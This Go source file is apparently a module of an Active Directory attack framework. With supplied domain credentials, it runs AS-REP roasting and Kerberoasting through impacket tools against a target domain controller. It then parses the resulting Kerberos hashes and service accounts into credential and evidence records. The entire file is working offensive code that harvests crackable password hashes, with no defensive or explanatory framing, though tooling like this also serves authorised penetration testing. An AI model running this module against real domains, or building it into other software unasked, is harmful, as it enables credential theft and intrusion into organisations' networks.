package modules

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"adpack/core"
	"adpack/utils"
)

func RunKerberos(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, _ := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for Kerberos operations")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "kerberos", Key: "error", Value: "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	asrep := runASREPRoast(domain, user, pass, targetHost)
	result.Creds = append(result.Creds, asrep.Creds...)
	result.Evidence = append(result.Evidence, asrep.Evidence...)
	result.Users = append(result.Users, asrep.Users...)

	spn := runKerberoast(domain, user, pass, targetHost)
	result.Creds = append(result.Creds, spn.Creds...)
	result.Evidence = append(result.Evidence, spn.Evidence...)
	result.Users = append(result.Users, spn.Users...)

	return result
}

func runASREPRoast(domain, user, pass, target string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	fmt.Printf("[*] AS-REP roasting against %s...\n", target)
	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
	if target != "" {
		args = append(args, "-dc-ip", target)
	}
	args = append(args, "-request")

	r := utils.RunCommand("impacket-GetNPUsers", args...)
	if !r.Success {
		fmt.Printf("[!] AS-REP roast failed: %s\n", r.Stderr)
		result.Success = false
		return result
	}

	re := regexp.MustCompile(`\$krb5asrep\$[^$]*\$([A-Za-z0-9._-]+)@([A-Za-z0-9.-]+)`)
	matches := re.FindAllStringSubmatch(r.Stdout, -1)
	for _, m := range matches {
		if len(m) < 3 {
			continue
		}
		username := m[1]
		userDomain := strings.ToLower(m[2])
		result.Users = append(result.Users, core.User{
			Username: username, Domain: userDomain,
			Source: "asrep_roast", NoPreauth: true,
		})
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "asrep_roast", Key: username + "@" + userDomain,
			Value:     "AS-REP roastable - no preauth required",
			Timestamp: time.Now(),
		})
		result.Creds = append(result.Creds, core.Credential{
			Type: "hash", Username: username, Domain: userDomain,
			Secret: m[0], Source: "asrep_roast",
		})
	}
	fmt.Printf("[+] AS-REP: %d roastable users found\n", len(matches))
	return result
}

func runKerberoast(domain, user, pass, target string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	fmt.Printf("[*] Kerberoasting against %s...\n", target)
	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
	if target != "" {
		args = append(args, "-dc-ip", target)
	}

	r := utils.RunCommand("impacket-GetUserSPNs", args...)
	if !r.Success {
		fmt.Printf("[!] Kerberoast failed: %s\n", r.Stderr)
		result.Success = false
		return result
	}

	re := regexp.MustCompile(`^(\S+)\s+(\S+)`)
	lines := strings.Split(r.Stdout, "\n")
	inTable := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "ServicePrincipalName") {
			inTable = true
			continue
		}
		if !inTable || trimmed == "" || strings.HasPrefix(trimmed, "-") {
			continue
		}
		m := re.FindStringSubmatch(trimmed)
		if len(m) < 3 {
			continue
		}
		spn := m[1]
		username := m[2]
		result.Users = append(result.Users, core.User{
			Username: username, Domain: domain,
			SPNs: spn, Source: "kerberoast",
		})
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "kerberoast", Key: username + "@" + domain,
			Value: spn, Timestamp: time.Now(),
		})
	}
	fmt.Printf("[+] Kerberoast: %d SPN accounts found\n", len(result.Users))
	return result
}
